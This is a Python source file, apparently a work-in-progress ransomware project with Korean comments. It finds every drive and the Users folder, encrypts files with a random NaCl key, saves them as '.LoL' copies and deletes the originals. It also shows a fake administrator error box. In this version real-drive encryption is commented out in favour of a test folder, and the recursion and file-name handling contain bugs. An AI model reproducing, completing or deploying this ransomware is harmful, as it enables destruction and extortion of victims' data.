import ctypes
import threading, pathlib, nacl.utils, tkinter
import os, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from time import sleep
from tkinter import messagebox

class EnDecryptor:
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def encryptFile(self):
        try:
            print("[DEBUG] 모듈 내부 암호화 시작. 대상", self._files)
            for file in self._files:
                print("[DEBUG]: 파일인가요?", os.path.isfile(file))
                if(os.path.isfile(file)==True):#파일이라면
                    print("[DEBUG] 파일이라고 판단")
                    if(file==sys.argv[0]):#현재의 파이썬 스크립트를 암호화하려하면 종료
                        return

                    print("[DEBUG] rb시작")
                    with open(file, "rb") as File:
                        data=File.read()
                    encryptedFile=self._encryptModule.encrypt(data)
                    with open(f"{file}.LoL", "wb") as File:
                        File.write(encryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on encrypt.encryptFile(): {e}")

    def decryptFile(self):
        try:
            print("[DEBUG] 모듈 내부 복호화 시작. 대상", self._files)
            for file in self._files:
                print("[DEBUG]: 파일인가요?", os.path.isfile(file))
                originName=file.strip(".LoL")
                if(os.path.isfile(file)==True):#파일이라면
                    print("[DEBUG] 파일이라고 판단")
                    if(file==sys.argv[0]):#현재의 파이썬 스크립트를 암호화하려하면 종료
                        return

                    print("[DEBUG] rb시작")
                    with open(file, "rb") as File:
                        data=File.read()
                    decryptedFile=self._encryptModule.decrypt(data)
                    with open(originName, "wb") as File:
                        File.write(decryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on decrypt.decryptFile(): {e}")

Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
EncryptModule=nacl.secret.SecretBox(Key)
MaxThread=120
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[r"C:\Users\\"]
for letter in range(97, 123):
    drive=f"{chr(letter)}:\\"
    if (pathlib.Path(drive).exists()):#존재하는 드라이브명 ex F:\\이면 추가
        PathList.append(drive)
PathList.remove("c:\\")
PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test_dir"]#실험 디렉토리

print(f"[DEBUG] Key: {Key}")
print(f"[DEBUG] PathList: {PathList}")

def changeBackground():
    pass

def recursiveEncrypt(dir):#객체를 언제 생성할 것인가? 1. 매 파일마다 객체 생성? 디렉토리별로 객체생성? 드라이브별로 객체생성? 스레드 내부에서 객체생성?
    #if(pathlib.Path(dir).exist!=True):#존재하는 경로인지 확인
    #    print("DEBUG: 존재하지 않는 디렉토리입니다")
    #    return
    for path, dirs, files in os.walk(dir):
        print("입력: ", dir)
        for i in range(len(files)):
            files[i]=dir+"\\"+files[i]
            print(files[i])#파일 절대경로로
            
        print("현재 순회중인 디렉토리: ",dir,", dir 수: ", len(dirs), ", file 수: ",len(files))
        if(len(files)>0):
            EnDecryptor(files, EncryptModule).encryptFile()#파일을 우선적으로 인코딩하고_디렉별로 객체생성

        if(len(dirs)>0):
            recursiveEncrypt(dir)#하부의 디렉토리는 재귀적으로 실행_스레드를 도입하려면 FileSize를 계산해야할

def recursiveDecrypt(dir):
    for path, dirs, files in os.walk(dir):
        for i in range(len(files)):
            files[i]=dir+"\\"+files[i]
        if(len(files)>0):
            EnDecryptor(files, EncryptModule).decryptFile()
        if(len(dirs)>0):
            recursiveDecrypt(dir)

def fakeAlert():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

if __name__ == '__main__':
    print("Admin여부", IsAdmin)
    if(IsAdmin==False):#디버그를 위한 강제실행
        changeBackground()
        for drive in  PathList:#실제 디렉토리
            #recursiveEncrypt(drive)
            print("타겟 드라이브: "+drive)#출력값만 확인
        for drive in PathList_DEBUG:#실험 디렉토리
            print("암호화 실행중인 디렉토리: ", drive)
            recursiveEncrypt(drive)#암호화 수행
            sleep(2)
            recursiveDecrypt(drive)
            print("복호화 완료")
            
            
    else:
        fakeAlert()
            
                          
                      
